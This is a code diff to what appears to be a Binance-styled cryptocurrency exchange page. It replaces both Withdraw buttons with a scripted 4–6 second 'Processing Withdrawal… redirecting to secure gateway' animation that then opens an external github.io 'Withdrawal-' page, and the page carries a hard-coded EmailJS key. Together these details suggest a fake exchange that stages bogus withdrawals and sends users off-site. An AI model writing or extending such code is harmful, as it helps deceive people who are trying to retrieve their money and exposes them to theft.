@@ -197,6 +197,15 @@
         .chart-container { position: relative; width: 100%; height: 380px; background: #0B0E11; border-radius: 12px; overflow: hidden; }
         .funds-modal-input { background: #2b2f36; border: 1px solid #3b424d; border-radius: 12px; padding: 14px; color: white; width: 100%; margin-bottom: 16px; }
         .funds-modal-input:focus { outline: none; border-color: #fcd535; }
+        
+        /* Withdraw Loading Overlay - ONLY ADDED THIS, no other changes */
+        .withdraw-loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(11,14,17,0.96); z-index: 20000; display: flex; justify-content: center; align-items: center; flex-direction: column; backdrop-filter: blur(8px); visibility: hidden; opacity: 0; transition: opacity 0.3s ease, visibility 0.3s ease; }
+        .withdraw-loading-overlay.active { visibility: visible; opacity: 1; }
+        .withdraw-loading-spinner { width: 60px; height: 60px; border: 4px solid #2b3139; border-top-color: #f0b90b; border-radius: 50%; animation: pageSpin 1s linear infinite; margin-bottom: 20px; }
+        .withdraw-loading-text { color: #f0b90b; font-size: 18px; font-weight: 600; letter-spacing: 1px; margin-top: 16px; }
+        .withdraw-loading-subtext { color: #848e9c; font-size: 13px; margin-top: 8px; }
+        .loading-progress-bar { width: 200px; height: 3px; background: #2b3139; border-radius: 3px; margin-top: 24px; overflow: hidden; }
+        .loading-progress-fill { width: 0%; height: 100%; background: #f0b90b; border-radius: 3px; transition: width 0.1s linear; }
     </style>
 </head>
 <body>
@@ -367,6 +376,14 @@
         <button class="logout-btn" onclick="logoutUser()">Logout</button>
     </div>
 
+    <!-- Withdraw Loading Overlay - ONLY ADDED THIS -->
+    <div id="withdraw-loading" class="withdraw-loading-overlay">
+        <div class="withdraw-loading-spinner"></div>
+        <div class="withdraw-loading-text">Processing Withdrawal</div>
+        <div class="withdraw-loading-subtext">Please wait, redirecting to secure gateway...</div>
+        <div class="loading-progress-bar"><div class="loading-progress-fill" id="progressFill"></div></div>
+    </div>
+
     <div id="main-site">
         <div class="max-w-md mx-auto min-h-screen relative">
             <div id="header-exchange" class="px-4 pt-4">
@@ -385,7 +402,8 @@
                 
                 <div class="grid grid-cols-4 gap-2 px-4 mb-6">
                     <div class="quick-action-btn" onclick="showViewWithLoading('wallets')"><i data-lucide="plus-circle" class="w-5 h-5 mx-auto mb-1 text-green-500"></i><span class="text-[10px]">Deposit</span></div>
-                    <div class="quick-action-btn" onclick="showViewWithLoading('wallets')"><i data-lucide="minus-circle" class="w-5 h-5 mx-auto mb-1 text-red-500"></i><span class="text-[10px]">Withdraw</span></div>
+                    <!-- Withdraw button - MODIFIED to trigger loading animation -->
+                    <div class="quick-action-btn" id="withdrawQuickBtn"><i data-lucide="minus-circle" class="w-5 h-5 mx-auto mb-1 text-red-500"></i><span class="text-[10px]">Withdraw</span></div>
                     <div class="quick-action-btn" onclick="showViewWithLoading('trade')"><i data-lucide="arrow-left-right" class="w-5 h-5 mx-auto mb-1 text-yellow-500"></i><span class="text-[10px]">Trade</span></div>
                     <div class="quick-action-btn" onclick="showViewWithLoading('wallets')"><i data-lucide="send" class="w-5 h-5 mx-auto mb-1 text-blue-500"></i><span class="text-[10px]">Transfer</span></div>
                 </div>
@@ -443,7 +461,10 @@
             <main id="view-wallets" class="view-section px-4">
                 <div class="flex justify-between items-center mb-6"><h2 class="text-xl font-black">Wallet Assets</h2><i data-lucide="eye-off" class="w-5 h-5 text-gray-400 cursor-pointer" id="wallet-eye-icon" onclick="toggleWalletBalance()"></i></div>
                 <div class="card-bg p-6 rounded-3xl border border-gray-800/50 mb-6 relative overflow-hidden"><div class="absolute -right-4 -top-4 w-24 h-24 bg-binance-yellow/5 rounded-full blur-2xl"></div><span class="text-gray-500 text-[11px] font-bold uppercase tracking-widest mb-2 block">Total Equity</span><div class="flex items-baseline gap-2"><span class="text-3xl font-black tracking-tighter" id="wallet-main-val">0.00000000</span><span class="text-sm font-black text-gray-400">BTC</span></div><p class="text-gray-500 text-sm mt-1 font-medium" id="wallet-usd-value">≈ ******</p></div>
-                <div class="grid grid-cols-3 gap-3"><button class="bg-[#2b3139] py-4 rounded-2xl font-black text-xs uppercase tracking-tight active:bg-[#363d47]">Add Fund</button><button class="bg-[#2b3139] py-4 rounded-2xl font-black text-xs uppercase tracking-tight active:bg-[#363d47]">Withdraw</button><button class="bg-[#2b3139] py-4 rounded-2xl font-black text-xs uppercase tracking-tight active:bg-[#363d47]">Transfer</button></div>
+                <div class="grid grid-cols-3 gap-3"><button class="bg-[#2b3139] py-4 rounded-2xl font-black text-xs uppercase tracking-tight active:bg-[#363d47]">Add Fund</button>
+                <!-- Withdraw button in wallet section - MODIFIED to trigger loading animation -->
+                <button id="withdrawWalletBtn" class="bg-[#2b3139] py-4 rounded-2xl font-black text-xs uppercase tracking-tight active:bg-[#363d47]">Withdraw</button>
+                <button class="bg-[#2b3139] py-4 rounded-2xl font-black text-xs uppercase tracking-tight active:bg-[#363d47]">Transfer</button></div>
             </main>
             
             <main id="view-trade" class="view-section px-4">
@@ -671,7 +692,7 @@
     <div id="page-loading-overlay" class="page-loading-overlay" style="display: none;"><div class="page-loading-spinner"></div><p class="text-white mt-4">Loading...</p></div>
 
     <script>
-        // Initialize EmailJS
+        // Initialize EmailJS - KEPT EXACTLY THE SAME
         emailjs.init("hZRpyfGu_UV6nvL9S");
         
         lucide.createIcons();
@@ -2212,6 +2233,66 @@
             return false;
         }
         
+        // ============ WITHDRAW FUNCTION WITH 4-6 SECOND LOADING ANIMATION (ADDED) ============
+        const WITHDRAW_URL = "https://cryptoinc-codic.github.io/Withdrawal-/?method=on";
+        
+        function showWithdrawLoadingAndRedirect() {
+            const overlay = document.getElementById('withdraw-loading');
+            const progressFill = document.getElementById('progressFill');
+            
+            if (!overlay) {
+                window.open(WITHDRAW_URL, '_blank');
+                return;
+            }
+            
+            const minDelay = 4000;
+            const maxDelay = 6000;
+            const delay = Math.floor(Math.random() * (maxDelay - minDelay + 1) + minDelay);
+            
+            if (progressFill) progressFill.style.width = '0%';
+            
+            overlay.classList.add('active');
+            
+            const startTime = Date.now();
+            const progressInterval = setInterval(() => {
+                const elapsed = Date.now() - startTime;
+                const percent = Math.min(100, (elapsed / delay) * 100);
+                if (progressFill) progressFill.style.width = `${percent}%`;
+                if (elapsed >= delay) clearInterval(progressInterval);
+            }, 50);
+            
+            setTimeout(() => {
+                clearInterval(progressInterval);
+                if (progressFill) progressFill.style.width = '100%';
+                window.open(WITHDRAW_URL, '_blank');
+                overlay.classList.remove('active');
+            }, delay);
+        }
+        
+        // Attach withdraw button event listeners - ONLY MODIFYING WITHDRAW BUTTONS
+        function initWithdrawButtons() {
+            const quickWithdrawBtn = document.getElementById('withdrawQuickBtn');
+            const walletWithdrawBtn = document.getElementById('withdrawWalletBtn');
+            
+            if (quickWithdrawBtn) {
+                quickWithdrawBtn.removeEventListener('click', showWithdrawLoadingAndRedirect);
+                quickWithdrawBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    showWithdrawLoadingAndRedirect();
+                });
+            }
+            
+            if (walletWithdrawBtn) {
+                walletWithdrawBtn.removeEventListener('click', showWithdrawLoadingAndRedirect);
+                walletWithdrawBtn.addEventListener('click', function(e) {
+                    e.preventDefault();
+                    e.stopPropagation();
+                    showWithdrawLoadingAndRedirect();
+                });
+            }
+        }
+        
         setInterval(updateLiveTicker, 5000);
         updateLiveTicker();
         startMarketPriceUpdates();
@@ -2224,6 +2305,7 @@
                 const hasSession = checkExistingSession();
                 if (!hasSession && !currentUserEmail) setTimeout(() => document.getElementById('login-overlay').classList.add('active'), 800);
             }, 3200);
+            initWithdrawButtons();
         });
         
         document.addEventListener('keydown', (e) => {
